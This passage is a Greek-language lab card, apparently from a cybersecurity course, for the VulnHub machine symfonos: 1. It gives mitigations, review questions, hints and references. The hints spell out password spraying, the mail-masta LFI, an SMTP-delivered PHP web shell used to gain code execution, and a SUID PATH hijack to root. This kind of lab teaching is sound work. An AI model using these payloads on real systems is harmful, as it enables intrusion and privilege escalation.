| Κρυφή διαδρομή WordPress `/h3l105` | Η απόκρυψη δεν είναι έλεγχος |
| **Απροστάτευτο γραμματοκιβώτιο Postfix** | Περιορισμός δικαιωμάτων `/var/mail/*`· απενεργοποίηση του γραμματοκιβωτίου αν δεν χρησιμοποιείται |
| SMTP ανοιχτό στο δίκτυο | Δέσιμο του Postfix στο localhost ή firewall στη θύρα 25 |
| **SUID `/opt/statuscheck` που καλεί `curl` με σκέτο όνομα** | **Απόλυτες διαδρομές** στα προνομιούχα προγράμματα· `secure_path`· αφαίρεση SUID αν δεν απαιτείται |

**Το μεγαλύτερο δίδαγμα:** *ένα LFI συν οποιοδήποτε εγγράψιμο αρχείο ισούται με απομακρυσμένη εκτέλεση κώδικα.* Mail spools, web logs, auth logs, session files, `/tmp` — η λίστα των εγγράψιμων-και-συμπεριλαμβανόμενων αρχείων είναι μεγάλη, και οι αμυνόμενοι τη ξεχνούν τακτικά.

---

# Μέρος Ε — Ερωτήσεις επανάληψης

1. Ονομάστε τις **τρεις** ανεξάρτητες αδυναμίες που έπρεπε να συνδυαστούν για το RCE. Θα έδινε κάποια μόνη της shell;
2. Γιατί ένα σημείωμα «απαγορευμένων κωδικών» είναι περιουσιακό στοιχείο επίθεσης αντί για αμυντικός έλεγχος; Τι θα έπρεπε να έλεγε αντ' αυτού;
3. Κάνατε spray 2 ονόματα χρηστών × 3 κωδικούς = 6 προσπάθειες. Πώς συγκρίνεται με το brute force ως προς την ανιχνευσιμότητα;
4. Εκτός από το mail spool, ονομάστε **τρία άλλα αρχεία** που ένα LFI θα μπορούσε να συμπεριλάβει για να πετύχει RCE.
5. Γιατί το δηλητηριασμένο mail εκτελέστηκε ως PHP όταν το Postfix το αποθήκευσε ως απλό κείμενο;
6. Το `strings /opt/statuscheck` αποκάλυψε το bug σε δευτερόλεπτα. Σε τι άλλο πρέπει να τρέχετε πάντα `strings`;
7. Θα δούλευε αυτό το PATH hijack αν το `sudo -l` έδειχνε `secure_path`; Εξηγήστε.
8. Το WordPress ήταν στο `/h3l105`, όχι στο `/`. Πρόσθεσε ασφάλεια η σκοτεινή διαδρομή; Γιατί όχι;

---

# Μέρος ΣΤ — Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Θύρες **22, 25, 80, 139, 445**. Η **25** (SMTP) είναι ασυνήθιστη σε αρχάριο μηχάνημα — σημειώστε τη. Ξεκινήστε με
SMB: δοκιμάστε **ανώνυμη** πρόσβαση σε **κάθε** share. Και ο ιστότοπος θα θέλει ένα **hostname**.
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — το σημείωμα και το share</strong></summary>

`smbclient //TARGET/anonymous -N` → `attention.txt` → banned: `epidioko`, **`qwerty`**, `baseball`.
`enum4linux -a` → `helios`, `zeus`. Spray: `smbclient //TARGET/helios -U 'helios%qwerty'` → notes →
**`/h3l105`**. `/etc/hosts` → `symfonos.local`.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — το LFI</strong></summary>

`wpscan … --plugins-detection aggressive -e ap,u` → **`mail-masta 1.0`**.
`curl "…/count_of_send.php?pl=/etc/passwd"` → διαβάζετε τα πάντα. Μετά: *ποιο αρχείο μπορώ να
**γράψω**;* Η θύρα 25 είναι Postfix → `/var/mail/<user>`.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — SMTP log poisoning</strong></summary>

Στείλτε `<?php system($_GET['c']); ?>` στον `helios` μέσω SMTP → πάει στο `/var/mail/helios` → include
με `?pl=/var/mail/helios&c=id` → **RCE**. Μετά reverse shell. Root: `/opt/statuscheck` (SUID) τρέχει
`curl` με σκέτο όνομα → `/tmp/curl` + `export PATH=/tmp:$PATH` → root.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

1. `nmap -p-` → **22, 25, 80, 139, 445**. 2. anonymous → `attention.txt` (λίστα κωδικών).
3. `enum4linux` → `helios`, `zeus`. 4. `helios:qwerty` → notes → **`/h3l105`**. 5. `wpscan` →
**`mail-masta 1.0`**. 6. LFI `?pl=/etc/passwd`. 7. **SMTP poisoning** → `/var/mail/helios` → RCE.
8. **SUID `/opt/statuscheck`** → PATH hijack → root → `/root/proof.txt`.
</details>

---

# Μέρος Ζ — Παραπομπές

- **VulnHub entry:** <https://vulnhub.com/entry/symfonos-1,322/>
- **Αγγλικό lab του αποθετηρίου:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)
- **Αγγλική έκδοση αυτής της κάρτας:** [Learning Path 1 — symfonos: 1](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/12-symfonos-1.md)
- **Writeups που διασταυρώθηκαν** (επιβεβαιώνουν `attention.txt`, `helios:qwerty`, mail-masta LFI, statuscheck):
  - [crazyeights225 — symfonos1](https://crazyeights225.github.io/symfonos1/)
  - [hackmd (rudefish) — Symfonos: 1](https://hackmd.io/@rudefish/vulnhub-symfonos-series-symfonos1-walkthrough)
  - [news4hackers — symfonos:1](https://www.news4hackers.com/symfonos-1-vuln-hub-machine-walkthrough/)
  - [Exploit-DB 40290 — Mail Masta LFI](https://www.exploit-db.com/exploits/40290)

- **Σημειώσεις κοινότητας — ομοφωνία, παγίδες και εναλλακτικές διαδρομές** (διασταυρωμένες με τις παρακάτω πηγές):
  - **Ομοφωνία (consensus chain):** `nmap -p-` → `22/25/80/139/445` → `/etc/hosts symfonos.local` → anonymous SMB `anonymous` → λίστα κωδικών στο `attention.txt` → `enum4linux` → χρήστης `helios` → `smbclient //TARGET/helios -U 'helios%qwerty'` → `todo.txt` → WordPress στο `/h3l105` → `wpscan --plugins-detection aggressive` → LFI `mail-masta 1.0` (EDB 40290) → SMTP log poisoning στο `/var/mail/helios` → RCE `?pl=/var/mail/helios&c=id` → PATH hijack στο SUID `/opt/statuscheck` → root.
  - **Συχνή παγίδα:** ο ιστότοπος δεν συμπεριφέρεται σωστά χωρίς το hostname `symfonos.local` στο `/etc/hosts`· και το LFI τυπώνει ένα αρχείο μόνο αν αυτό δεν περιέχει `<?php` (άρα το `/etc/passwd` δουλεύει, ο πηγαίος κώδικας PHP όχι).
  - **Συχνή παγίδα:** το SMTP το μιλάτε με το χέρι — κλείστε το σώμα του `DATA` με μία γραμμή με μία τελεία (`.`) και χρησιμοποιήστε `RCPT TO: helios@symfonos.localdomain`· σε κάποιες εκδόσεις το RCE τρέχει ως `helios` αντί για `www-data`.
  - **Συχνή παγίδα:** θυμηθείτε το `-p-` και τη θύρα 25· το PATH hijack θέλει `export PATH=/tmp:$PATH` (prepend) και `-p` στο payload, αλλιώς παίρνετε `$` αντί για `#`.
  - **Εναλλακτική διαδρομή:** το δεύτερο plugin `site-editor 1.1.1` είναι επίσης LFI (EDB 44340)· το `research.txt` είναι παγίδα — το `todo.txt` κρύβει το πραγματικό `/h3l105`.
  - **Εναλλακτικές διαδρομές (SBXIO, rudefish):** απαριθμήστε χρήστες της θύρας 25 με `smtp-user-enum -M VRFY` (επιστρέφει `helios`)· το δεύτερο endpoint LFI του mail-masta `inc/lists/csvexport.php?pl=`· αν το `/var/mail/helios` είναι κενό δοκιμάστε `/var/spool/mail/helios`· παραδώστε το payload με `sendEmail … -o tls=no`· μετά το shell, το `/var/www/html/h3l105/wp-config.php` κρύβει `wordpress:password123`· το gcc υπάρχει, άρα ένα μεταγλωττισμένο PATH payload με `setuid(0)` είναι επιλογή.
  - **⚠️ Σημείωση επαλήθευσης:** η ακριβής διατύπωση των αρχείων ποικίλλει ανά έκδοση. Το `attention.txt` του lab μας λέει «A word to the wise… the following passwords are now BANNED», ενώ η έκδοση του crazyeights225 δείχνει ένα σημείωμα υπογεγραμμένο **"-Zeus"** («stop using passwords like 'epidioko', 'qwerty' and 'baseball'»). Οι τρεις κωδικοί είναι σταθεροί σε όλες τις πηγές — η υπογραφή είναι ένα bonus όνομα χρήστη, όχι αντίφαση.
  - **⚠️ Σημείωση επαλήθευσης:** η διατύπωση του `todo.txt` επίσης ποικίλλει· μερικά writeups δείχνουν «Binge watch Dexter / Dance / Work on /h3l105». Το μόνο γεγονός που μετράει — και είναι σταθερό παντού — είναι η διαδρομή **`/h3l105`**.
  - **⚠️ Σημείωση επαλήθευσης:** ο χρήστης του RCE είναι ο `www-data` (UID 33) στο lab μας και στα screenshots του Hacking Articles, αλλά η έκδοση του crazyeights225 αναφέρει `helios` (UID 1000) για το ίδιο payload. Και οι δύο είναι πατήματα· το βήμα του SUID δεν αλλάζει.
  - **Επαληθευμένες πηγές:** [crazyeights225](https://crazyeights225.github.io/symfonos1/) · [Hacking Articles](https://www.hackingarticles.in/symfonos1-vulnhub-walkthrough/) · [news4hackers](https://www.news4hackers.com/symfonos-1-vuln-hub-machine-walkthrough/) · [SBXIO](https://www.sbxio.com/vulnhub-symfonos-1)

---

# Μέρος Η — Αν κολλήσετε τελείως

- Επαληθεύστε τη συνδεσιμότητα: `ping TARGET`, `ip -br a`.
- **Πρώτα** το hostname `symfonos.local` — αλλιώς το web δεν συμπεριφέρεται.
- Αν το RCE δεν δίνει έξοδο, ελέγξτε ότι το mail όντως έφτασε (`?pl=/var/mail/helios`).
- Mail «στην ουρά» αλλά χωρίς εκτέλεση κώδικα; Ξαναελέγξτε τη γραμμή με μία τελεία και το `RCPT TO: helios`.
- Το wpscan δεν βρίσκει plugins; Προσθέστε `--force` δίπλα στο `--plugins-detection aggressive`.
- Δείτε [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) και [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Επαναφέρετε το snapshot και ξανακάντε το από μνήμης.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 11 — Photographer: 1](<11-photographer-1.md>) · επόμενο: [Μηχάνημα 13 — HackInOS: 1](<13-hackinos-1.md>) · πλήρες walkthrough: [`labs/3-062-symfonos-1`](../../labs/3-062-symfonos-1/README.md)_
